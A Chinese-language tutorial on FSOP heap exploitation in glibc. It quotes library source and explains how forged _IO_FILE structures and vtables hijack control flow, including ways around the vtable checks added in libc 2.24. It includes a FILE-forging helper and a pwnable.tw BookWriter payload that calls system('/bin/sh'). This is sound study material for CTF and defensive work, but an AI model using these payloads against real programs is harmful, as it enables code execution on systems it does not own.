# FILE_IO 攻击技术解析 #

## 1. 重要更新

**注：重要！重要！重要！ glibc2.28 之后不会再调用 allocate_buff 和 free_buff 这两个函数指针，也就是说无法再利用 _IO_str_jumps 函数做文章了。**

**exit 调用到 _IO_flush_all_lockp 的路径为（libc2.29）：**

1. **__run_exit_handlers**
2. **__call_tls_dtors**，在该函数中通过虚表指针调用 fcloseall
3. **__fcloseall**
4. **_IO_cleanup**
5. **_IO_flush_all_lockp** 

## 2. 什么是 FSOP

**FSOP** 是（File Stream Oriented Programming）的缩写，根据前面对 FILE 的介绍得知进程内所有的 `_IO_FILE` 结构会使用 `_chain` 域相互连接形成一个链表，这个链表的头部由 `_IO_list_all` 全局变量维护。

**FSOP** 的核心思想就是劫持 `_IO_list_all` 的值来伪造链表和其中的 `_IO_FILE` 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用 `_IO_flush_all_lockp()`，这个函数会刷新 `_IO_list_all` 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用`_IO_FILE_plus.vtable` 中的 `_IO_overflow()` 函数指针。

使用 python 伪造 `_IO_FILE` 结构体时的一个小技巧：可以通过定义一个结构体，然后填充各个字段的内容。

```python
def pack_file_64(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _mode = 0):
    struct = p64(_flags) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, "\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xc0,"\x00")
    struct += p64(_mode)
    struct = struct.ljust(0xd8, "\x00")
    return struct
```




## 3. libc 2.24 及之前版本的利用方法 ##
在 libc2.24 之前没有对 `vtable` 合法性的检验，因此可以将 `vtable` 伪造在任意可以控制的地方（常见利用方法为在堆上伪造该虚表）。  

`_IO_flush_all_lockp()` 函数会在以下3中情况下被调用：  

1. 当发生内存错误的时候（此时会调用 `malloc_printerr()` 函数）  
2. 在执行 `exit` 函数时  
3. `main` 函数正常返回时（其实之后也会执行 exit）  

这里给出当 libc 检测到内存错误时该函数的调用路径： 

`malloc_printerr -> libc_message -> abort（_GI_abort与abort强链接） -> fflush（_IO_flush_all_lockp的宏定义) -> _IO_flush_all_lockp`

### 3.1 _IO_flush_all_lockp()

```c++
int _IO_flush_all_lockp (int do_lock)
{
	int result = 0;
	struct _IO_FILE *fp;
	int last_stamp;
	#ifdef _IO_MTSAFE_IO
		__libc_cleanup_region_start (do_lock, flush_cleanup, NULL);
		if (do_lock)
			_IO_lock_lock (list_all_lock);
	#endif
	last_stamp = _IO_list_all_stamp;
	fp = (_IO_FILE *) _IO_list_all;		//取链表头的fp指针
	while (fp != NULL)
	{
		run_fp = fp;
		if (do_lock)
			_IO_flockfile (fp);
		if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)		
			// fp->_mode<0 表示使用字节流模式，fp->_mode=0 表示当前模式未指定，fp->_mode>0 表示使用宽字节流。
            // 这里是一个很重要的判断条件，在下文会有说明
			#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
				|| (_IO_vtable_offset (fp) == 0
				&& fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base))
			#endif
			) && _IO_OVERFLOW (fp, EOF) == EOF)		//调用 vtable 函数列表中的 _IO_overflow 函数
			result = EOF;
		if (do_lock)
			_IO_funlockfile (fp);
		run_fp = NULL;
        if (last_stamp != _IO_list_all_stamp)
        {
            /* Something was added to the list.  Start all over again.  */
            fp = (_IO_FILE *) _IO_list_all;
            last_stamp = _IO_list_all_stamp;
        }
        else
            fp = fp->_chain;
	}
#ifdef _IO_MTSAFE_IO
	if (do_lock)
		_IO_lock_unlock (list_all_lock);
	__libc_cleanup_region_end (0);
#endif
	return result;
}
```

### 3.2 触发 _IO_overflow

触发 `_IO_overflow` 函数的条件（任选其一即可）：

	1. fp->_mode <= 0  //表示使用字节流
	2. fp->_IO_write_ptr > fp -> _IO_write_base	//表示还有数据没有写入内核缓冲区  
或者满足  

	1. fp->_vtable_offset = 0  
	2. fp->_mode > 0  //表示使用宽字节流
	3. fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base  

`fp->_mode` 字段是用来判断当前文件流的类型，`fp->_mode < 0` 表示使用字节流模式，因此接下来只需要判断 `_IO_write_ptr` 是否大于`_IO_write_base`（是否还有数据没有写入）。如果 `fp->_mode >= 0` 表示使用了宽字节流模式（或者当前模式未指定），此时需要检查是 `_wide_data` 结构体中是否还有未写入的数据，并且 `fp->_vtable_offset` 字段必须为0。  

这里有一点需要注意的地方就是，如何修改\_IO\_list\_all字段。如果有任意地址写任意值的漏洞，这自然不用说，将其改到一个我们可以直接控制的地址即可。还有一种情况在heap利用中较为常见，利用unsortedbin attack能达到任意地址写固定值（&main\_arena->topchunk），此时我们就要利用\_IO\_FILE的chain字段了。  

**这里有一点需要注意，不是只能通过unsortedbin attack改写IO\_list\_all然后触发错误机制采用使用FSOP，如果我们有一个任意地址写漏洞，那么可以直接进行改写。同时，fwrite函数在满足一定条件下同样会调用overflow函数。**

由于此时\_IO\_list\_all = &main\_arena->topchunk，因此chain字段的地址就为 &main\_arena->topchunk + 0x68（64bit，32位下+0x34），也就是落到了bin[5]（64bit下为smallbin 0x60，32位下为smallbin 0x30）链表范围内。这样如果我们能伪造一个在该范围内的chunk并free它（要确保其落入smallbin，而不是待在unsortedbin中），就可以成功触发漏洞。

那么如何才能保证即触发unsortedbin attack修改IO\_list\_all，又能修改在0x60的smallbin中放入一个预先布置好的堆块呢？  
方法就是：在修改unsortedbin的bk字段的同时，修改unsortedbin的size字段为0x61，然后再分配一个不等于0x60的chunk。这样由于unsortedbin的机制，请求的size大小不等于当前分配的chunk，会将该chunk先扔进对应的smallbin，继续遍历unsortedbin。  
![check1](https://raw.githubusercontent.com/fade-vivida/libc-linux-source-code-study/master/libc_study/picture/check2.png)  
其实此时还绕过了另一个检查，由于`bck != unsorted_chunks (av)`，导致该unsortedbin不会切割分配。  
![check2](https://raw.githubusercontent.com/fade-vivida/libc-linux-source-code-study/master/libc_study/picture/check1.png)  


一个代码实例如下所示（pwnable.tw BookWriter）：
<pre class = "prettyprint lang-javascript">
fake_bk = io_list_all - 0x10
fake_fd = top_addr
payload += '/bin/sh\0' + p64(0x61) + p64(fake_fd) + p64(fake_bk)
payload += p64(2) + p64(3)
payload += (0xc0-0x30)*'\x00' + p64(0)	//_mode
payload += '\x00'*0x10 + p64(heap_addr+0x160+0xd8+8)
payload += p64(0)*2 + p64(1) + p64(system_addr)

另一种写法：
payload += pack_file_64(_flags = u64('/bin/sh\0'),
					   _IO_read_ptr = 0x61,
					   _IO_read_end = fake_fd,
					   _IO_read_base = fake_bk,
					   _IO_write_base = 2,
					   _IO_write_ptr = 3)
vtalbe = heap_addr+0x160+0xd8+8
payload += p64(vtalbe)
payload += p64(0)*2 + p64(system_addr) + p64(system_addr)
</pre>
## 2. FSOP防御机制（libc2.24之后的利用方法） ##
从libc2.24开始，加入了对于vtable的检查函数，即在<a href = "#6">2.3小节</a>提到的IO\_validata\_vtable和\_IO\_vtable\_check两个函数。

<pre class="prettyprint lang-javascript"> 
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
	/* Fast path: The vtable pointer is within the __libc_IO_vtables section.  */
	uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
	const char *ptr = (const char *) vtable;
	uintptr_t offset = ptr - __start___libc_IO_vtables;
	if (__glibc_unlikely (offset >= section_length))
		/* The vtable pointer is not in the expected section.  Use the slow path, which will terminate the process if necessary.  */
		_IO_vtable_check ();
	return vtable;
}
</pre>
其中IO\_validate\_vtable函数主要检查当前vtable是否在正常范围内（\_\_libc\_IO\_vtables section，该节的属性为只读）。如果不在则调用\_IO\_vtable\_check函数进行更为细致的检查。  

\_IO\_vtable\_check函数源代码如下所示：
<pre class="prettyprint lang-javascript"> 
void attribute_hidden
_IO_vtable_check (void)
{
	#ifdef SHARED
  	/* Honor the compatibility flag.  */
  	void (*flag) (void) = atomic_load_relaxed (&IO_accept_foreign_vtables);
	#ifdef PTR_DEMANGLE
  	PTR_DEMANGLE (flag);		
	//该宏定义的功能为：对指针进行保护，具体做法为与线程保护值相异或，原理类似stack canny
	#endif
  	if (flag == &_IO_vtable_check)
		return;
	/* In case this libc copy is in a non-default namespace, we always
    	need to accept foreign vtables because there is always a
     	possibility that FILE * objects are passed across the linking
     	boundary.  */
  	{
		Dl_info di;
		struct link_map *l;
		if (_dl_open_hook != NULL		//是否设置了open_hook
			|| (_dl_addr (_IO_vtable_check, &di, &l, NULL) != 0
			&& l->l_ns != LM_ID_BASE))
      		return;
  	}

	#else /* !SHARED */
	/* We cannot perform vtable validation in the static dlopen case
	because FILE * handles might be passed back and forth across the
	boundary.  Therefore, we disable checking in this case.  */
  	if (__dlopen != NULL)
		return;
	#endif
	__libc_fatal ("Fatal error: glibc detected an invalid stdio handle\n");
}
</pre>

该函数大体意思为：如果定义了SHARED，则需要检查是否设定了接受外来vtables。如果是则直接返回，除此之外还会检查是否设置了\_dl\_open\_hook

（**注：这里有一种攻击方法就是通过各种改写\_dl\_open\_hook的值，使其不为0，然后就可以利用libc2.24之前的方法伪造vtable表**）  

## 3. 绕过FSOP防御机制 ##
从libc2.24开始，libc加入了针对文件流虚表（vtable）的检测机制。下面介绍针对该检测机制的两种绕过方法。
### 3.1 改写\_dl\_open\_hook ###
该方法已在2中进行了表述，其实就是通过其他漏洞改写了dl\_open\_hook后，在按无检查的时候利用即可。
### 3.2 利用\_IO\_str\_jumps ###


由于在新的检测机制下，会检查虚表的地址是否在规定的合法范围内，因此我们无法再伪造vtable结构。既然无法将 vtable 指针指向 \_\_libc\_IO\_vtables 以外的地方，那么就在 \_\_libc\_IO\_vtables 里面找些有用的东西。比如 \_IO\_str\_jumps（该符号在strip后会丢失），但我们可以根据\_IO\_file\_jumps以及相对偏移（一般来说为0xc0，但具体使用时还需要视情况而定）来计算它的相对位置。

下面是\_IO\_str\_jumps虚表结构体的相关成员
<pre class = "prettyprint lang-javascript">
// libio/strops.c
#define JUMP_INIT_DUMMY JUMP_INIT(dummy, 0), JUMP_INIT (dummy2, 0)

const struct _IO_jump_t _IO_str_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_str_finish),
  JUMP_INIT(overflow, _IO_str_overflow),
  JUMP_INIT(underflow, _IO_str_underflow),
  JUMP_INIT(uflow, _IO_default_uflow),
  JUMP_INIT(pbackfail, _IO_str_pbackfail),
  JUMP_INIT(xsputn, _IO_default_xsputn),
  JUMP_INIT(xsgetn, _IO_default_xsgetn),
  JUMP_INIT(seekoff, _IO_str_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_default_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};
</pre>
\_IO\_strfile结构体

<pre class = "prettyprint lang-javascript">
struct _IO_str_fields
{
  _IO_alloc_type _allocate_buffer;		//函数指针
  _IO_free_type _free_buffer;			//函数指针
};

struct _IO_streambuf
{
  struct _IO_FILE _f;
  const struct _IO_jump_t *vtable;
};

typedef struct _IO_strfile_
{
  struct _IO_streambuf _sbf;
  struct _IO_str_fields _s;		//虚表
} _IO_strfile;
</pre>
在这个vtable中有两个函数我们可以拿来利用，\_IO_str\_overflow和\_IO\_str\_finish。

#### 3.2.1 \_IO\_str\_overflow利用方法 ####
其中\_IO\_str\_overflow代码如下所示：
<pre class = "prettyprint lang-javascript">
int _IO_str_overflow (_IO_FILE *fp, int c)
{
  int flush_only = c == EOF;
  _IO_size_t pos;
  if (fp->_flags & _IO_NO_WRITES)
      return flush_only ? 0 : EOF;
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
  {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_IO_write_ptr = fp->_IO_read_ptr;
      fp->_IO_read_ptr = fp->_IO_read_end;
  }
  pos = fp->_IO_write_ptr - fp->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_blen (fp) + flush_only))  // 条件 #define _IO_blen(fp) ((fp)->_IO_buf_end - (fp)->_IO_buf_base)
  {
	if (fp->_flags & _IO_USER_BUF) /* not allowed to enlarge */
		return EOF;
	else
	{
		char *new_buf;
		char *old_buf = fp->_IO_buf_base;
		size_t old_blen = _IO_blen (fp);
		_IO_size_t new_size = 2 * old_blen + 100;      // 通过计算 new_size 为 "/bin/sh\x00" 的地址
		if (new_size < old_blen)
			return EOF;
		new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size);     
		// 在这个相对地址放上 system 的地址，即 system("/bin/sh")
    [...]
</pre>
因此我们可以下面的方式对fp指针进行构造：
所以可以像下面这样构造：

    fp->_flags = 0
    fp->_IO_buf_base = 0
    fp->_IO_buf_end = (bin_sh_addr - 100) / 2		//如果之后替换的时one_gadget而不是system，则不用这一步
    fp->_IO_write_ptr = 0xffffffffff	//这里需要注意，该值不能过小
    fp->_IO_write_base = 0			//实际就是_IO_write_ptr >_IO_write_base
    fp->_mode = 0
其中fp->\_IO\_write\_ptr的值我们之所以要设置为一个比较大的数是为了绕过`pos >= (_IO_size_t) (_IO_blen (fp) + flush_only)`检查。

此时，根据代码所示可以推导出如下等式：  
`old_blen = _IO_blen(fp) = fp->_IO_buf_end - _IO_buf_base = _IO_buf_end`  
`new_size = 2 * old_blen + 100 = 2*_IO_buf_end + 100 = (bin_sh_addr - 100）/ 2 * 2 + 100 = bin_sh_addr`  
这样我们就布置好了system函数需要调用的参数，接下来就是如何控制程序执行流程了。

我们注意到在\_IO\_str\_overflow函数中有这样一行代码

	new_buf = (char *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size); 
可以看到在该函数中有一个虚表调用，调用的函数地址为相对fp偏移0xe0（64bit）的\_allocate\_buffer函数，如果我们把该地址的内容替换为system函数，不就可以劫持程序控制流了吗？确实如此！我们只要在fp+0xe0（也就是紧跟在虚表后的地址）的位置放置system函数（或者one\_gadget）的指针即可劫持控制流。  
**有一点要注意的是，如果 bin\_sh\_addr 的地址以奇数结尾，为了避免除法向下取整的干扰，可以将该地址加 1。另外 system("/bin/sh") 是可以用 one\_gadget 来代替的，这样似乎更加简单。**

利用\_IO\_str\_overflow的完成调用过程（还有其他的利用路径，本文只列出了针对malloc\_printerr的情况）：

	malloc_printerr -> __libc_message -> __GI_abort -> _IO_flush_all_lockp -> __GI__IO_str_overflow
#### 3.2.2 \_IO\_str\_finish利用方法 ####
在vtable中还有另一个函数可以利用，就是\_IO\_str\_finish，该函数的利用方式较为简单，下面我们先看看该函数的代码。
<pre class = "prettyprint lang-javascript">
void _IO_str_finish (_IO_FILE *fp, int dummy)
{
  if (fp->_IO_buf_base && !(fp->_flags & _IO_USER_BUF))             // 条件
    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_IO_buf_base);     // 在这个相对地址放上 system 的地址
  fp->_IO_buf_base = NULL;

  _IO_default_finish (fp, 0);
}
</pre>
我们只要让 fp->\_IO\_buf\_base 等于"/bin/sh" 的地址，然后设置 fp->_flags = 0 就可以了绕过函数里的条件。

接下来的关键就是如何控制程序执行流程到\_IO\_str\_finish。一个显而易见的方法为调用fclose函数，但这用方法有局限性，不是每个程序都会调用fclose。那么还有没有一条其他的路径呢？答案是有！，我们还是利用异常处理。

通过前面对\_IO\_flush\_all\_lockp 函数的分析，我们知道该函数最终会调用 \_IO\_OVERFLOW执行 \_\_GI\_\_IO\_str\_overflow，而 \_IO\_OVERFLOW 是根据 \_\_overflow 相对于 \_IO\_str\_jumps vtable 的偏移（64bit，offset = 0x18）找到具体函数的。所以如果我们伪造传递给 \_IO\_OVERFLOW(fp) 的 fp->vtable 为 \_IO\_str\_jumps 减去 0x8，那么根据偏移（+0x18），程序将找到 \_IO\_str\_finish (\_IO\_str\_jumps - 0x8 + 0x18 = \_IO\_str\_jumps + 0x10）并执行。

所以可以像下面这样构造：

	fp->_flag = 0
	fp->_mode = 0
	fp->_IO_write_ptr = 0xffffffff	
	fp->_IO_write_base = 0		//_IO_write_ptr > _IO_write_base 即可
	fp->_IO_buf_base = bin_sh_addr

完整的调用过程：

	malloc_printerr -> __libc_message -> __GI_abort -> _IO_flush_all_lockp -> __GI__IO_str_finish

### 3.3 利用\_IO\_wstr\_jumps ###
\_IO\_wstr\_jumps 也是一个符合条件的 vtable，总体上和上面讲的 \_IO\_str\_jumps 差不多。

\_IO\_wstr\_jumps虚表结构如下所示：
<pre class = "prettyprint lang-javascript">
// libio/wstrops.c

const struct _IO_jump_t _IO_wstr_jumps libio_vtable =
{
  JUMP_INIT_DUMMY,
  JUMP_INIT(finish, _IO_wstr_finish),
  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wstr_overflow),
  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wstr_underflow),
  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),
  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wstr_pbackfail),
  JUMP_INIT(xsputn, _IO_wdefault_xsputn),
  JUMP_INIT(xsgetn, _IO_wdefault_xsgetn),
  JUMP_INIT(seekoff, _IO_wstr_seekoff),
  JUMP_INIT(seekpos, _IO_default_seekpos),
  JUMP_INIT(setbuf, _IO_default_setbuf),
  JUMP_INIT(sync, _IO_default_sync),
  JUMP_INIT(doallocate, _IO_wdefault_doallocate),
  JUMP_INIT(read, _IO_default_read),
  JUMP_INIT(write, _IO_default_write),
  JUMP_INIT(seek, _IO_default_seek),
  JUMP_INIT(close, _IO_default_close),
  JUMP_INIT(stat, _IO_default_stat),
  JUMP_INIT(showmanyc, _IO_default_showmanyc),
  JUMP_INIT(imbue, _IO_default_imbue)
};

_IO_wint_t _IO_wstr_overflow (_IO_FILE *fp, _IO_wint_t c)
{
  int flush_only = c == WEOF;
  _IO_size_t pos;
  if (fp->_flags & _IO_NO_WRITES)
      return flush_only ? 0 : WEOF;
  if ((fp->_flags & _IO_TIED_PUT_GET) && !(fp->_flags & _IO_CURRENTLY_PUTTING))
  {
      fp->_flags |= _IO_CURRENTLY_PUTTING;
      fp->_wide_data->_IO_write_ptr = fp->_wide_data->_IO_read_ptr;
      fp->_wide_data->_IO_read_ptr = fp->_wide_data->_IO_read_end;
  }
  pos = fp->_wide_data->_IO_write_ptr - fp->_wide_data->_IO_write_base;
  if (pos >= (_IO_size_t) (_IO_wblen (fp) + flush_only))    // 条件 #define _IO_wblen(fp) ((fp)->_wide_data->_IO_buf_end - (fp)->_wide_data->_IO_buf_base)
  {
      if (fp->_flags2 & _IO_FLAGS2_USER_WBUF) /* not allowed to enlarge */
			return WEOF;
      else
	  {
	  		wchar_t *new_buf;
	  		wchar_t *old_buf = fp->_wide_data->_IO_buf_base;
	  		size_t old_wblen = _IO_wblen (fp);
	  		_IO_size_t new_size = 2 * old_wblen + 100;              // 使 new_size * sizeof(wchar_t) 为 "/bin/sh" 的地址

	  		if (__glibc_unlikely (new_size < old_wblen)
	      		|| __glibc_unlikely (new_size > SIZE_MAX / sizeof (wchar_t)))
	    		return EOF;
	
	  		new_buf = (wchar_t *) (*((_IO_strfile *) fp)->_s._allocate_buffer) (new_size * sizeof (wchar_t));    // 在这个相对地址放上 system 的地址
	[...]
</pre>
其他的都没有发生变化，唯一需要注意的就是其中条件判断的字段都变为了fp->\_wide_data字段。  

_IO_wide_data 字段的定义如下所示：

```c++
struct _IO_wide_data
{
  wchar_t *_IO_read_ptr;	/* Current read pointer */
  wchar_t *_IO_read_end;	/* End of get area. */
  wchar_t *_IO_read_base;	/* Start of putback+get area. */
  wchar_t *_IO_write_base;	/* Start of put area. */
  wchar_t *_IO_write_ptr;	/* Current put pointer. */
  wchar_t *_IO_write_end;	/* End of put area. */
  wchar_t *_IO_buf_base;	/* Start of reserve area. */
  wchar_t *_IO_buf_end;		/* End of reserve area. */
  /* The following fields are used to support backing up and undo. */
  wchar_t *_IO_save_base;	/* Pointer to start of non-current get area. */
  wchar_t *_IO_backup_base;	/* Pointer to first valid character of
				   backup area */
  wchar_t *_IO_save_end;	/* Pointer to end of non-current get area. */

  __mbstate_t _IO_state;
  __mbstate_t _IO_last_state;
  struct _IO_codecvt _codecvt;

  wchar_t _shortbuf[1];

  const struct _IO_jump_t *_wide_vtable;
};
```



利用函数 \_IO\_wstr\_finish：

<pre class = "prettyprint lang-javascript">
void _IO_wstr_finish (_IO_FILE *fp, int dummy)
{
  if (fp->_wide_data->_IO_buf_base && !(fp->_flags2 & _IO_FLAGS2_USER_WBUF))    // 条件
    (((_IO_strfile *) fp)->_s._free_buffer) (fp->_wide_data->_IO_buf_base);     // 在这个相对地址放上 system 的地址
  fp->_wide_data->_IO_buf_base = NULL;
  _IO_wdefault_finish (fp, 0);
}
</pre>